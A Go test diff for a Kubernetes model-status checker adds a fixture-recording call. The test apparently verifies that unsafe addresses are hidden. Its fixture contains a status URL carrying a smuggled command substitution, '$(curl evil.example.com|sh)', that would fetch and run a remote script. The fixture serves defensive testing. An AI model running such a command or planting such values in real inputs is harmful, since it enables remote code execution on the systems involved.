@@ -39,6 +39,7 @@ func TestStatusHidesUnsafeAddresses(t *testing.T) {
 	mc := newModelsCluster(t)
 	mc.f.putJSON(testModelPath, `{"metadata":{"labels":{"app.kubernetes.io/managed-by":"rhoai-nightly-updater"},"managedFields":[{"manager":"rhoai-nightly-updater","operation":"Apply"}]},
 		"status":{"url":"https://inference.apps.example.com/proj/$(curl evil.example.com|sh)","conditions":[{"type":"Ready","status":"True"}]}}`)
+	recordModelFixture(mc.f, testModelPath)
 	mc.f.onGet = nil
 	st, err := GetResourcesStatus(mc.c)
 	if err != nil {
